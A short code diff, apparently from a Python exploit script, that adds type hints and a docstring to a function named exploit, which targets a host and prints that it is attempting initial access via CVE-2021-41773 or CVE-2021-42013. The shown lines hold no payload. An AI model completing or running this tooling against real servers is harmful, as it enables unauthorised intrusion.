@@ -3,7 +3,10 @@
 import requests
 import os
 
-def exploit(ip_dest, port_dest, ip_src, port_src):
+def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int) -> bool | Exception:
+    """
+    Try to exploit the vulnerability
+    """
     try:
         host = 'http://{0}:{1}'.format(ip_dest, port_dest)
         print('[+] Attempting to gain initial access with CVE-2021-41773 or CVE-2021-42013 on {}'.format(host))
